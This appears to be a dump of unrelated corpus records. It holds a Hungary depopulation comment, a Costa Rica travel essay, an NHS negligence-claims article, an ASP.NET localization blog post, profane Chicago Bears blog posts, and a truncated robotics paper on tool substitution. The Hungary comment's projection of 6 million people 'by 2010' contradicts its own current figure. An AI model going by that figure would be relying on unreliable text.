not, than in many western countries.\nBeautiful country . If you love nature this is one of the most preserved and the capital is stunning. And no racial issues. unlike uk, france etc.\nThe depopulation of Hungary and most of Eastern Europe in the next 80-100 years will destabilize that part of the world economically, politically and militarily. According to these projections, Hungary will be down to about 6,000,000 (6 million) people by 2010. Not only will there be less people, the number of elderly will skyrocket. It will be impossible to maintain an economy with such reductions in the workforce. It will be impossible to maintain national security with such low numbers. Hungary today, with about 9,700,000 people is able is already experiencing severe labor shortages and is able to only field a 29,700 person active military (about half the size of the New York City Police Department. Included in this number is a very high percentage (17.5%) females and a large number of old out of shape males. The current economy only supports about a 1% of GDP on military spending which is half the NATO minimum (2%) of spending required by member states. The countries of Western Europe will be less and less inclined to guarantee the security of an Eastern Europe that is depopulated, militarily unprepared and an economic basket case. The very survival of these countries are at stake.\nThe mistake that most people make is that they think politicians care about their country. Orban is no different than other leaders. They strip their respective countries of wealth and enrich their family and friends. If Orban really cared about Hungary he would reduce corruption and this way reduce taxes so disposable income would rise. The current system of ambiguous tax laws and no-bid contracts is disgustingly obvious.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 33522}

{"text": "It was an impulse, an urge to escape an overstaying house guest, a desire to be somewhere\u2014anywhere\u2014as the odometer of the millennia rolled over.\nI dug the Mountain Travel Sobek brochure out from the piles on my desk and found myself on the phone with a helpful guide. There were three options, she explained: the summit of Mount Kilimanjaro if I could be packed and on a plane in the morning, Machu Picchu if I wasn't deterred by the season of rain, or sea kayaking and rafting in Costa Rica. I wasn't climb-a-mountain-tomorrow fit, and there were rumors Peru's Shining Path might target tourists in Y2K confusion, so less than 10 days before the first day of the year 2000, I paid my deposit, booked a flight to San Jose, and nudged my guest on to his next friend's couch.\nEven gentle waves require relaxing into the rhythm of the sea. Sitting in the sea kayak, paddle resting in my lap, I stopped and breathed\u2014really breathed\u2014inhaling time that couldn't be hurried.\nThe group got to know each other as we practiced staying perpendicular to the waves in the expanse of the Nicoya Peninsula. It was the conversations, the connections, that would stay with me longer than the well-curated days of adventure and exploring.\nLate in the afternoon, the camp came into view and by the time we navigated to shore, only a minor spill amongst us, the other guides had populated the tents with mattresses and bedding, stocked the kitchen, and were half way up a coconut palm to harvest the last ingredient for bitingly fresh pi\u00f1a coladas.\nThe next night, as the millennium clock ticked over, we were three days into new friendships, celebrating and silly, with grass skirts and high spirits. We toasted each time zone: London at cocktail hour, Rio de Janeiro at dessert, Nova Scotia for those who wanted to escape early. As the evening waned and I toasted my distant home, I wandered to the water's edge.\nThe still sea carried the day's warmth, and I stripped down and waded in. I floated, buoyant, content. The sky was littered with stars, and another light caught my eye: the bio-luminescent bay flashed with every splash, comets trailing from my fingertips. I dipped below the surface, twisted in a sparkling cloud and swam, suspended between eras, in black liquid and light.

The report named 'High value and fatality related claims' is one of the three thematic reviews into compensation claims brought by patients who suffered injuries as a result of negligent NHS emergency care in England between 2014 and 2018.\nThe combined cost of 86 settled fatal injury claims was \u00a35.8 million, with an average compensation payout to the patient's family of just over \u00a345,000. Causes of patient deaths include; misdiagnosis of infection or sepsis, pulmonary embolism (PE), falls in hospital, medication errors, cardiovascular heart conditions and failure to prevent venous thromboembolism (VTE).\nOn the other hand, the 16 'high value' claims had a combined cost of \u00a333 million meaning that average payouts to individuals was just over \u00a32 million. Negligent actions like missed diagnosis and failure to investigate showed up in all 'high value' claims, especially those relating to spinal cord injury (SCI) and brain injury.\nEmergency Medicine And Negligent A&E Or ED Care\nIn the past 10years running, emergency medicine has had either the highest or second highest number of new claim notifications to NHS Resolution. In 2020/21 ED claims accounted for 11% (1,151) of all medical negligence claims reported to NHS Resolution with an estimated cost (in compensation and legal fees) just shy of \u00a3322 million. There has been a 17% rise in A&E attendances and a 23% rise in A&E claims between 2010/11 and 2019/20. The NHS Resolution also reports that claims arising from NHS emergency care are still low when compared with A&E attendance rates, at one claim for every 17,000 episodes of ED care.\nCommon themes that were associated with causing high levels of harm to patients from negligent emergency care included:\nFailings in the investigations process, leading to missed or delayed diagnosis;\nFailure in recognising and responding to patients who were deteriorating or who re-attended hospital;\nAn overarching issue with providing patients with timely, proper review by senior clinicians.\nSome of the patient's conditions included traumatic spinal cord injury (SCI), tumours, haematoma, abscesses and cauda equina. The NHS Resolution discovered that although almost all these patients had earlier been seen by their GP or hospital on more than one occasion, there was little evidence that a senior clinician reviewed them when they visited the hospital for the second, third or fourth time with the same problem.\nCarotid artery dissection, haemorrhage and meningitis were some of the conditions responsible for brain injuries suffered by patients. It was discovered that none of the patients had a typical history but taking accurate history of the patients from all available sources should have prevented misdiagnosis.\nFurthermore, the NHS Resolution found out that ambulance and triage notes and GP letters accompanying patients were not available or read by the doctors who attended to them, their conditions were misdiagnosed and there was long waits for review from a more senior doctor even after diagnosis which led to delays in scanning and interpretation of results.\nMedication errors such as giving a medication intended for another patient as well as giving excessive doses of morphine led to death of some patients. Also, patients died as a result of being given drugs they were allergic to or failing to give them their regular prescription drugs as well as failing in managing their condition when it deteriorated.\nNeed Help With Medical Negligence Arising From Medication Errors, Or Resulting To Spinal Cord Injury And Birth Injuries?\nAt NHS Negligence Claim, our solicitors are committed to seeing that patients who have suffered as a result of medical negligence or loved ones of persons who died due to negligent treatment are able to get injury compensation as well as compensation for wrongful death.\nThis offers them a chance to rebuild their lives and improve their quality of life going forward without having to suffer financially as a result of the loss of a breadwinner or inability to return to work due to the injury.

Besides being a developer working defining the architecture that will be adopted in a given project and doing the hard \"FUN\" work writing the code, I'm also a translator if you don't know it yet.\nOne thing I've been trying to do recently is to be able to use localized strings that are present in an external assembly [ DLL ] using the ResourceManager object.\nI have localized strings in resource [ .resx ] files that are specific for each locale I support. I place these .resx files in a separate class library project to maintain things organized.\nSo, suppose the namespace of this class library is MyProject.L10n and the .resx file name is Localization.resx. This gives me access to a class named Localization within the code. I also have Localization.pt.resx. I support English and Portuguese locales in my project for now. This naming pattern allows me to have in the future a file called Localization.es-ES.resx for Castilian Spanish (as written and spoken in Spain) and another one called Localization.es-AR.resx for Argentine Spanish. During runtime the .NET framework will select the correct .resx file to extract the localized string from based on the current culture the user has set while browsing my website.\nIn the code block above I'm using WebGrid that is a new helper that comes with ASP.NET MVC 3. It simplifies the task of rendering tabular data. When I do item.Type.ToString() I'm actually getting different values for each row of my grid and I pass this dynamic value to ResourceManager that in return gives me the translated/localized version of a give string key.\nHope this post helps shed some light in this subject since the only thing that should be done is to get a reference to the assembly that holds the Localization class and pass it to the ResourceManger's constructor.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 16726}

I also hate NBC and Turner, but that's already been discussed as well. I was going to write about this last week, but wanted to let it go. I want Dick Stockton to go away. I said many years ago that he was the original Kiss of Death to Chicago Sports. Kenny Albert gladly followed suit. Dick Stockton was the shithead I had to hear during every game of the Cubs' 2007 and 2008 playoff runs. The results of all of those games? Losses. Hearing him made it even worse. Last week, I was shocked he was even calling the game. I expected the new Kiss of Death in Albert or even the amazing Thom Breneman (sarcasm).\nBut if the Bears were actually, I don't know, a football team, maybe we would always have ones like Joe Buck or Kevin Burkhardt. I know, a lot of people hate Buck. But at least he isn't Dick Stockton or Kenny Albert. Fuck those two.\nNow, onto what I really wanted to talk about:\nThis week, I about had it. The Bears played even WORSE than they did last year. This was just fucking awful. Even Marc Trestman has had more wins than John Fox in the two years both have coached. What a shame.\nThe only good thing about this year was Jordan Howard. The Bears somehow, found someone that they could help build an offense around (need a quarterback too, obviously). He set the all-time rookie rushing record in franchise history. I know that doesn't mean shit in the grand scheme of things, but it's something that we could maybe look forward to next season. He is really good.\nWe will see what happens with Pace and Fox in the coming days. But, this whole thing just fucking smells. I know we said the same shit years ago with Angelo, Lovie, Emery and Trestman. But, damn. I don't think shit is going to change unless the McCaskey's sell this abysmal franchise. They need to sell it to someone who knows how to run a football team. What they are doing now isn't working. I mean, Ted Phillips has been with the team for 30 fucking years and is a damn accountant. What he is doing as the president of a professional football team? Fuck this.\nSince the McCaskey's are never going to sell this team, no great general manager is just going to fall into their laps in anytime soon. This team is fucked for a very long time.\nThis entry was posted on January 1, 2017 at 9:30 pm and is filed under Uncategorized. You can follow any responses to this entry through the RSS 2.0 feed.

I think he's on some stuff again:\nhttp://www.si.com/nfl/2017/01/01/alshon-jeffery-chicago-bears-super-bowl-champions-next-year\nFro, What do you think of this Arkush piece?\nhttp://www.nwitimes.com/sports/football/hub-arkush-despite\u2014season-ryan-pace-should-give/article_eda81430-96c3-5312-b474-0b277884257b.html\nHey, Arkush is spot-on most of the time. He was in the press conference the other day. John Fox jumped around his questions about clock management. And while Fox continued to say injuries weren't an excuse, he kept bringing them up like they were.\nThe Bears should have won three or four more games at the least. Now, I am aware that results in a 7-9 record at-best, but damn. Fox really sucks. In regards to Pace, he's drafted complete busts so far with the exception of Jordan Howard.\nAnd the man in charge, George McCaskey, says they aren't selling the team and everyone will remain in their positions with the front office.\nhttp://chicago.cbslocal.com/2017/01/05/bears-chairman-george-mccaskey-we-have-no-intention-of-selling/\nBy the way, Ted Phillips (a man who was hired as an accountant), is still the president of the team. A guy who probably didn't know what a football was before he was hired 30 years ago, is the president of a professional football team. That's like someone being a janitor at a school and sometime later, becomes appointed as a teacher. Fuck.\n\"And the man in charge, George McCaskey, says they aren't selling the team and everyone will remain in their positions with the front office.\" And that sounds like the Cubs cf. 2004 \u2013 2009, or before fan boy caught a clue and hired Epstein.\nI imagine you're excited about the Blackhawks this year.

{"text": "\\section{Introduction}\n\\label{sec:introduction}\n\n\n\n\nThe sophistication pertaining to tool-use in humans involves not just the dexterity in manipulating a tool, but also the diversity in tool exploitation.\nThe ability to exploit the tools has enabled humans to adapt and thus exert control over an uncertain environment, especially when they are faced with unfavorable situations.\nFor example, if we don't find a hammer to hammer a nail into a wall, we will use a heel of a shoe or a rock or if a tray is unavailable for serving the drinks, we will use a plate for serving.\nIn situations like these, humans seem to know - either from the past experience or from observations or from the ``necessity is the mother of improvisation (invention)'' type approach - what \\emph{kind} of object is needed as a substitute. \n\n\nOn the contrary, consider a robot performing a task that involves tool use.\nWhen a robot is operating in a dynamic environment, it can not be assumed that a tool required in the task will always be available. \nIn situations like these, an effective way for a robot would be to find an alternative as humans do, for example, use an eating plate for serving, rather than wait until a tray becomes available. \nThis skill is significant when operating in a dynamic, uncertain environment because it allows a robot to adapt to unforeseen situations to a degree.\nThe question is how can a robot determine which object in the environment is a viable candidate for a substitute?\nA possible approach would be by interacting with an object in a manner missing tool is maneuvered.\nHowever, it would be time consuming if a robot interacts with every single object in the environment to determine a viability which makes this approach less practical.\n\nIn this prototypical work, we propose a non-invasive approach that identifies viable candidate/s from the existing objects in the environment.\nThis paper makes the following contributions:\n1) An approach to create grounded knowledge about objects expressed in terms of their properties (Sec. \\ref{subsec:KB_method}), \n2) %\nan approach to identify relevant properties of a missing tool and determine a substitute on the basis of them (Sec. \\ref{subsec:reasoner}). %\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\\section{Related Work}\n\\label{sec:related_work}\nTypically, a substitute for a missing tool is determined by means of knowledge base that provides knowledge about objects and similarity measures to determine the similarity between a missing tool and a potential substitute. \nIn the following, in addition to the approaches to determine a substitute, we also report the literature related to existing knowledge bases developed for robotic applications.\n\n\\subsubsection{Knowledge Base}\n\\label{subsec:related_kb}\n\nWe reviewed in \\cite{Thosar2018} nine existing knowledge bases namely: KNOWROB \\cite{Tenorth}, MLN-KB \\cite{Zhu2014}, NMKB \\cite{Pineda2017}, OMICS \\cite{Gupta2004}, OMRKF \\cite{Suh2007}, ORO \\cite{Lemaignan2010}, OUR-K \\cite{Lim2011}, PEIS-KB \\cite{Daoutis2009}, and RoboBrain \\cite{Saxena2014}.\nThe objective was to determine whether these existing knowledge bases contain 1) ontological knowledge about the properties of objects, 2) such knowledge is grounded into robot's perception, and 3) intra-class variability in a property is modeled instead of expressing the property in a binary form.\nWe gained primarily the following insights which form the basis for our work.\n\nWe noted that the majority of the knowledge bases relied on the external human-centric commonsense knowledge bases such as WordNet, %\nCyc, %\nOpenCyc, %\nand some either relied on the hand-coded knowledge %\nor on the knowledge acquired by human-robot interaction. %\nThe main issue, we believe is that, the depth and breadth of the human-centric knowledge base is not observable by a robot in its entirety due to its limited sensing capabilities. \nThis causes a disconnect between human-centric knowledge and robot-centric perception.\nTo deflect this issue, we aim to acquire the robot-centric perceptual data for different properties of objects.\nSuch property data can then be used to generate grounded knowledge about objects (see Sec. \\ref{subsec:know_acqui}).\n\n\\subsubsection{Substitution Computation}\n\\label{subsec:related_sub_comp}\n\nOne of the closest areas that study the usability of an object is affordancs of tools where the primary focus is to examine various functional abilities of an object by exploring what actions can be performed on the object and observing its responses.\nAs such, using a substitute in place of a missing tool can also be seen as transferring of an affordance of the missing tool to the substitute after determining similarity between them.%\n\nIn \\cite{Awaad2014a}, a substitute for a missing tool is inferred on the basis of inheritance and equivalence relations.\nThe work discussed in \\cite{Agostini2015} retrieves the knowledge about objects from the ROAR \\cite{Szedmak2014} relational database and determines a substitute that shares similar affordances.\nHowever, in ROAR, the knowledge is acquired either using machine learning techniques requiring training examples or inferred or hand-coded.\nThe work in \\cite{Boteanu2016} uses the ConceptNet where potential candidates are extracted from the knowledge base if they share the same parent with a missing tool for the predetermined relations: \\textit{has-property}, \\textit{capable-of} and \\textit{used-for}.\nAfter eliminating irrelevant candidates, a substitute is determined on the basis of the similarity metrics.\nThe approach proposed in \\cite{Abelha2016} uses a part-based 3D model and weight of an object to determine the orientation and manipulation of a substitute to be used as a missing tool.\nIn the cases where supervised machine learning technique is used, providing bulk of labeled examples beforehand would not be realistic for a substitution problem scenario.\nOn the other hand, the approaches which rely on existing external knowledge bases are built around the available knowledge in the knowledge bases which does impose some constraints. %\nWe circumvents this issue by first identifying what knowledge is generally required to determine a substitute and then build an approach to acquire the required knowledge and compute a substitute on the basis of it.\n\n\n\\section{Challenges}\n\\label{sec:challenges}\n\n\n\\textit{How to characterize similarity between a missing tool and a potential substitute: } \nA candidate for a substitute is expected to be similar to a missing tool to some degree to ensure a substitutability.\nThe notion of similarity can be understood in various forms, for instance, a distance between two objects denoted by two points in a multi-dimensional space or two objects belonging to the same cluster or aspects of the objects that are identified as shared. \nIn this work, the question will be addressed in a broader sense: it is not merely about identifying a similar object by deploying some similarity measure, instead, it is about gaining an access to what aspects of the objects were found to be shared between the similar objects.\n\n\n\\textit{What kind of knowledge is required to determine the similarity: } \nIt has been demonstrated in the literature on tool use in humans and animals alike that in order to use an object in tasks one needs to have knowledge about objects \\cite{Baber2003}.\nBaber in \\cite{Baber2003_1} also noted that conceptual knowledge about objects is especially desired in tool use where a systematic deliberation is called for.\nFor a robot, the story won't be much different if it is expected to perform in the real world along side humans.\nAs a consequence, a robot needs conceptual knowledge about an object where the object will not be only a physical entity that is merely to be perceived, but also a concept which consists of distinct characteristics and relations which set each object apart from each other and also similar to each other.\n\n\\textit{How to acquire the necessary knowledge: }\nThe acquisition of such conceptual knowledge is not without challenge.\nFrom a robot stand-point, it is a trade-off between what needs to be known and what can be known.\nThe trade-off is a direct consequence of the limited perception capabilities of a robot which often leads to partial understanding of the environment.\nWhile deploying a multi-modal perception to extract the required knowledge about objects would be an ideal solution, however, it carries its own set of complexities such as noisy sensors, dynamicity of the environment, complexities of the composition of an object.\nFor this prototypical work, the necessary knowledge is acquired using human-centric as well as machine-centric methods.\n\n\\textit{How to maneuver a substitute as a missing tool: }\nOnce the substitute has been identified, a robot is expected to use it in place of a missing tool and achieve the same result as the missing tool in the task.\nThe challenge to estimate the maneuver as well as grasping of a substitute is two fold: to determine whether the maneuver and grasping knowledge of a missing tool can be transferred and utilized on a substitute, else, estimate the maneuver and grasping for a substitute such that it can be used as a missing tool in the task.\n\nFor this work, we have focused on the first three challenges and have developed a prototypical system called ERSATZ (German word for a substitute or alternative) where the focus is to identify the required knowledge to determine a substitute and develop a system that computes a substitute for a missing tool.\n\n\\section{Approach}\n\\label{sec:approach}\n\nThe proposed approach distinguishes a tool from a substitute where a tool is defined as an artifact that is designed, manufactured and maneuvered in accordance with its designated purpose in the tasks such as hammer for hammering, tray for serving etc., while a substitute is seen as an extension of a missing tool.\nWithin the context of a designated purpose, the relationship between a tool and a substitute is symmetric, for instance, for hammering, a hammer can be replaced by a heeled shoe and vice versa.\nHowever, it may not always be the case once you step outside the context, for instance, a hammer can not replace a heeled shoe.\nOur research work, therefore, focuses on searching for a substitute for a conventional tool required in the ongoing task as opposed to determining a substitute for itself.\n\nConsider a scenario in which a robot has to choose between a plate and a mouse pad as an alternative for a tray.\nA tray can be defined as a rigid, rectangular, flat, wooden, brown colored object while a plate can be defined as a rigid, circular, semi-flat, white colored object and a mouse pad as soft, rectangular, flat, leather-based object.\nBear in mind, however, that some properties are more relevant than others with respect to the designated purpose of the tool.\nFor a tray whose designated purpose is \\textit{to carry}, rigid and flat are more relevant to \\textit{carry} than a material or a color of a tray.\nConsequently, to find the most appropriate substitute, the relevant properties of the unavailable tool need to correspond to as large a degree as possible to the properties of the possible choices for a substitute. \n\nThe proposed approach performs conceptual knowledge-driven computation to identify the relevant properties of the missing tool and determines the most similar substitute on the basis of those properties.\nBesides identifying the most similar object as a substitute for a missing tool, the proposed approach grants an explicit access to the relevant properties of the missing tool which carries twofold advantages: firstly, knowing which properties are primarily required in the potential substitute narrows down the search space and secondly, in case of an unknown object instance, only the relevant properties will have to be learned to determine a substitute.\n\nThe conceptual knowledge considered in this work primarily involves properties of the objects.\nThe properties considered are divided into \\emph{physical} and \\emph{functional} properties where physical properties describe the physicality of the objects such as \\emph{rigidity}, \\emph{weight}, \\emph{hollowness} while the functional properties ascribe the (functional) abilities or affordances to the objects such as \\emph{containment}, \\emph{blockage}, \\emph{support}.\nThe functional properties in the proposed approach play a primary role in identifying the relevant properties of a missing tool (see Sec. \\ref{subsec:reasoner}).\n\nThe functional properties considered in this work are derived from the theory of image schemas \\cite{Gardenfors1987} which has its roots in cognitive linguistics. \nAccording to \\cite{Kuhn2007} \\textit{image schemas are patterns abstracted from spatio-temporal experiences.}\nEssentially image schemas capture recurrent patterns that emerge from our perceptual and bodily interactions with the environment. \nSince some of these patterns are posited on the operational abilities of objects Kuhn postulated in \\cite{Kuhn2007} that affordances a.k.a. functional properties \\cite{Gardenfors1987} for the spatio-temporal processes can be derived from image schemas. \nFor example, the \\textit{containment} schema suggest an object's ability to contain something or the \\textit{support} schema indicates an object's ability to hold up something or the \\textit{blockage} refers to the ability of an object to block or obstruct the movement of an other object.\nCurrently, the proposed system is restricted to three functional properties based on image schemas: \\textit{containment}, \\textit{support} and \\textit{blockage}.\nWhile the functional properties as well as the designated purpose can both be identified as affordances, the proposed approach is built by hypothesizing that the functional properties are building blocks upon which designated purposes of tools rest.\n\n\n\\section{Methodology}\n\\label{sec:method}\n\\subsection{Knowledge Acquisition}\n\\label{subsec:know_acqui}\nOur ultimate objective is to acquire machine centric data from which property specific data can be extracted.\nSuch property data will then be used to generate grounded knowledge about objects.\nAs a first step, our initial property acquisition focuses on the composite of a machine-centric and a human-centric method.\nIn the machine-centric approach, geometrical properties are acquired using a non-invasive vision-based technique \nwhile non-geometric properties are acquired by sampling from the data from the expert generated intuitive model for the properties.\n\n\n\n\n\n\n\\textbf{Machine Generated Properties:}\nIn this paper, we introduce\na state-of-art data-driven approach that unsupervisedly conceptualizes shape according to commonalities within object point clouds which is discussed in detail in  our work \\cite{mueller_iros_2018}.\nAs a result of the process, a set of shape concepts is generated which concept responses for an unknown object are used in the knowledge base as machine-generated geometric object properties.\n\n\nIn our previous work on shape concept learning~\\cite{mueller_iros_2018}, raw sensor information in form of point clouds is abstracted to a symbolic level in which point cloud segments~\\cite{MuellerBirkIcra2016} may represent meaningful shape components in a symbolic space~\\cite{6942984}.\nTherein we introduce a hierarchical learning procedure that leads to symbols which are gradually organized to reflect generic-to-specific facets of shape components and can be subsequently used as building blocks that constitute objects (see A in Fig.~\\ref{fig:approach_illustration}).\n\\begin{figure}[tb]\n\t\\small\n\t\\centering\n\t\\includegraphics[width=0.99\\linewidth]{illustration3_1_ts_comp}\n\t\\caption{Illustration of the object shape conceptualization approach~\\cite{mueller_iros_2018}. Concepts are randomly colored.}\n\t\\label{fig:approach_illustration}\n\\end{figure}\n \nAn object shape representation is introduced that gradually encodes observed objects symbol compositions (see B in Fig.~\\ref{fig:approach_illustration}): from local components to component groups that may represent object parts or objects as a whole.\nThe proposed shape representation incorporates aspects of exemplar, respectively, prototype theory since we believe that the richness of a prototype provides an unaltered perspective on the characteristics of object instances.\nBased on the proposed symbolic shape representation we analyze \\emph{topology} and \\emph{structure} within the encoded symbol \\emph{compositions} in order to discover persistent patterns that may represent \\emph{shape concepts}.\n\nWe introduce an iterative filtering process~\\cite{mueller_iros_2018} to associated instances to groups which may represent shape concepts (see C in Fig.~\\ref{fig:approach_illustration}). \nGiven the set of learned concepts, for an unknown object, concept responses are retrieved (see D in Fig.~\\ref{fig:approach_illustration}) and exploited as machine-generated geometric object property values in our tool-substitution scenario. \nNote that in our tool-substitution scenario, concepts are learned from unlabeled object instances of the \\emph{Object Discovery Dataset(ODD)}~\\cite{MuellerBirkIcra2016}; the ODD provides a variety of objects from \\emph{teddy bears} over \\emph{flash lights} to \\emph{shoes} which facilitates an expressive concept generation.\n\n\\textbf{Human Generated Properties}\nThe geometric properties alone offer a very limited scope of the physicality as well as the functionality of an object. Therefore, to compensate the gap, we also considered non-geometrical properties such as weight, rigid, hollowness as physical and support, blockage, containment as functional.\nNote that, in general, these properties are challenging and cumbersome to extract solely from non-invasive visuoperceptual approaches.\nConsequently, extracting such properties via multi-modal or manipulation capabilities is needed, but this is beyond the scope of this paper. \nIn the generation process, a set of labeled prototype objects selected from the Washington dataset (see Table \\ref{tab:datasize}) were taken into account.\nThe distribution of each property for particular object labels (cf. Table~\\ref{tab:datasize}) was approximated by an expert to resemble the scope for the variations in the values of the property in general.\nConsequently, given an object and its label, a sample value was drawn from the a-priori generated property distribution.\n\n\n\\subsection{Knowledge about Objects}\n\\label{subsec:KB_method}\nKnowledge about objects is spread across three levels: the first level consists of the data about the machine-generated as well as human-generated properties, the second level consists of qualitative knowledge about individual object instances, while the third level consists of the aggregated qualitative fuzzy knowledge about respective classes of object instances.\nThe fuzzy formalism is used to model the intra-class variations in the objects.\nIn the following, we discuss the formal description of the methodology deployed to create grounded knowledge about objects. \n\nConsider \\textbf{O} as a given set of object class labels where (by abuse of notation) each object class is identified with its label.\nLet each object class $O \\in \\textbf{O}$ be a given set of its instances. \nLet $\\bigcup \\textbf{O}$ be a union of all object classes such that \n$\\vert \\bigcup \\textbf{O} \\vert  = n$.\nLet $\\textbf{P}$ and $\\textbf{F}$ be the given sets of physical properties' labels and a set of functional properties' labels respectively.\nBy abuse of notation, each physical and functional property is identified with its label.\nFor each physical property $P \\in \\textbf{P}$ as well as for a functional property $F \\in \\textbf{F}$, sensory data is acquired from each object instance $o \\in \\bigcup \\textbf{O}$.\nLet $P_n$ and $F_n$ represent sets of $n$ number of extracted sensory values from $n$ number of object instances for a physical property $P \\in \\mathbf{P}$ and a functional property $F \\in \\mathbf{F}$ respectively    .\n\n\n\\subsubsection{Sub-categorization - From Continuous to Discrete}\n\\label{subsubsec:subcategory}\nThe sub-categorization process is performed to form (more intuitive) qualitative measures to represent the degree with which a property is reflected by an object instance.\nIt is the first step in creating symbolic knowledge about object classes where the symbols representing the qualitative measures of a physical or a functional property reflected in an object instance are generated unsupervisedly by a clustering mechanism.\nA qualitative measure of a physical property is referred to as a physical quality and that of a functional property as a functional quality.\n\nIn this process, $P_n$ and $F_n$ representing measurements of a physical property $P \\in \\mathbf{P}$ and a functional property $F \\in \\mathbf{F}$ respectively extracted from $n$ number of object instances is categorized into a given number of discrete clusters $\\eta$ using a clustering algorithm.\nLet $\\nabla_P$ and $\\nabla_F$ be partitions of the sets $P_n$ and $F_n$ after performing clustering on them. \nLet $P_\\eta$ and $F_\\eta$ be the sets of labels, expressing physical qualities and functional qualities, generated for a physical property $P \\in \\textbf{P}$ and a functional property $F \\in \\textbf{F}$ respectively.\nGiven the label for a property, the quality labels are generated by combining a property label $P$ and a cluster label (created by the clustering algorithm).\nFor instance, the quality labels for a property $size$ are represented as $\\{ size\\_1, size\\_2, size\\_3, size\\_4 \\}$. \nAt the end of the sub-categorization process, the clusters are mapped to the generated symbolic labels for qualitative measures.%\n\nNote that the number of clusters essentially describes the granularity with which each property can qualitatively be represented. \nThe higher number of clusters suggest that an object is described in a finer detail which may obstruct the selection of a substitute since it may not be possible to find a substitute which is similar to a missing tool down to the finer details. \nFor example, in $ size = \\{ small, \\text{ }medium, \\text{ }big, \\text{ }bigger\\} $, \\textit{size} is a physical property and \\textit{small, medium, big, bigger} are its physical qualities.\nThe semantic terms given above are meant for the readers to understand the qualitative measures of the properties.\n\n\n\n\n\n\n\n\\subsubsection{Attribution - Object Instance Knowledge}\n\\label{subsubsec: attribution}\n\nThe attribution process generates knowledge about each object instance by aggregating all the physical and functional qualities assigned to the object instance by the \\textit{sub-categorization} step.\nIn other terms, the knowledge about an instance consists of the physical as well as functional qualities reflected in the instance.\nLet $\\textbf{P}_\\eta$ and $\\textbf{F}_\\eta$ be the families of sets containing the physical quality labels $P_\\eta$ and the functional quality labels $F_\\eta$ for each physical property $P \\in \\mathbf{P}$ and functional property $F \\in \\mathbf{F}$ respectively.\nThus, each object instance $o \\in \\bigcup \\mathbf{O}$ is represented as a set of all the physical as well as functional qualities attributed to it which are expressed by a symbol $holds$ as:\n$ holds \\subset \\bigcup \\textbf{O}  \\times  ( \\textbf{P}_\\eta  \\cup \\textbf{F}_\\eta) $\nFor example, knowledge about the instance $plate_{1}$ of a \\textit{plate} class can be given as,\n$holds(plate_{1}, medium)$, $holds(plate_{1}, harder)$, $holds(plate_{1}, can\\_support)$ where \\textit{medium} is a physical quality of \\textit{size} property, \\textit{harder} is a physical quality of \\textit{rigidity} property and \\textit{can\\_support} is a functional quality of \\textit{support} property.\n\n\n\n\n\\subsubsection{Conceptualization - Knowledge about Objects}\n\\label{subsubsec: concept_object}\n\nThe conceptualization process aggregates the knowledge about all the instances of an object class.\nThe aggregated knowledge is regarded as conceptual knowledge about an object class.\n\nLet $\\textbf{O}_{KB}$ be a knowledge base about object classes where each object class $O \\in \\textbf{O}$.\nGiven the knowledge about all the instances of an object class $O$, in the conceptualization process, the knowledge about the object class $O_{K} \\in \\textbf{O}_{KB}$ is expressed as a set of tuples consisting of a physical or a functional quality and its proportion (membership) value in the object class. %\nA tuple is expressed as $\\langle O, t, m \\rangle$ where $ t \\in \\textbf{P}_\\eta  \\cup \\textbf{F}_\\eta $ and \na proportion value $m$ is calculated using the following membership function:\n$m = P(holds(o, t) | o \\in O) $. %\nThe proportion value allows to model the intra-class variations in the objects.\n\nFor example, knowledge about object class \\textit{table} can be expressed as:\n\\{$\\langle$\\textit{plate, harder, 0.6}$\\rangle$, $\\langle$\\textit{plate, light\\_weight, 0.75}$\\rangle$, \n$\\langle$\\textit{plate, less\\_hollow, 0.67}$\\rangle$, $\\langle$\\textit{plate, hollow, 0.33}$\\rangle$, \n$\\langle$\\textit{plate, more\\_support, 0.71}$\\rangle$\\}, \nwhere the numbers indicate that, for instance, physical quality \\textit{harder} was observed in 60\\% instances of object class \\textit{plate}.\nAt the end of the conceptualization process, conceptual knowledge about an object class is created which is represented in a symbolic fuzzy form and grounded into the human-generated or machine-generated data about the properties of objects.\nThe knowledge about objects is then used to determine a substitute from the existing objects in the environment.\n\n\\subsubsection{Conceptualization - Knowledge about Functional Properties}\n\\label{subsubsec:function_model}\n\nIn addition to conceptual knowledge about objects, \\textit{Conceptualization} process also creates knowledge about functional quality, termed as a function model, by associating the occurrence of physical qualities in an object instance with the occurrence of a functional quality in the instance and aggregating the result of such concurrent occurrences. \nThe role of a functional model is discussed later in the section \\ref{subsubsec:relevant}.\nGiven the knowledge about the object instances, a function model $f_d$ of a functional quality $f \\in \\textbf{F}_\\eta$ is expressed as a set of tuples containing a functional quality $f \\in \\textbf{F}_\\eta$, a physical quality $p \\in \\textbf{P}_\\eta$ and a proportion value $d$.\nA tuple is represented as $\\langle f, p, d \\rangle$ where $f \\in \\textbf{F}_\\eta, p \\in \\textbf{P}_\\eta $ and a proportion value $d$ is computed as, $d = P(holds(o, p)|holds(o, f))$\nFor example, a function model for a functional quality \\textit{more\\_support} is given as, \\{ $\\langle$\\textit{more\\_support, harder,0.8}$\\rangle$, $\\langle$\\textit{more\\_support, softer, 0.2}$\\rangle$ where the number indicates that, for instance, functional quality $more\\_support$ and a physical quality $harder$ co-occurred in the knowledge about the object instances $80$\\% of the time.\n\n\n\n\n\n\n\\subsection{Reasoner}\n\\label{subsec:reasoner}\n\\begin{figure}\n  \\centering\n    \\includegraphics[width=0.99\\textwidth]{reasoner}\n  \\caption{A typical process flow to determine a substitute for a missing tool from the available objects.} %\n \\label{fig:reasoner}\n\\end{figure}\n\nFig. \\ref{fig:reasoner} illustrates a process flow consisting of the primary operations involved in determining a substitute.\nThe flow offers an approximated aerial view for the prototypical model of ERSATZ.\nWhen ERSATZ is queried to find a substitute for a missing tool \\textit{x} from the set of available objects \\textit{Y} the system checks if the substitution model for \\textit{x} exists in the knowledge base.\nIf the substitution model does not exist, then the reasoner computes the relevant functional and physical properties of the queried tool.\n\n\\subsubsection{Representative Models}\n\\label{subsubsec:representative}\nA representative physical model and a representative functional model of an object consists of the physical or functional qualities, respectively, that are regarded as representative qualities of the object class, while the qualities which do not fall under representative qualities are regarded as exceptional or uncommon qualities.\n\nLet $O \\in \\textbf{O}$ be an object class of a missing tool and let $\\theta$ is a \\textit{representative model threshold} which qualifies a physical or a functional quality as stereotypical or representative to the object class $O$.\n$ O_{rp} $ is called as a 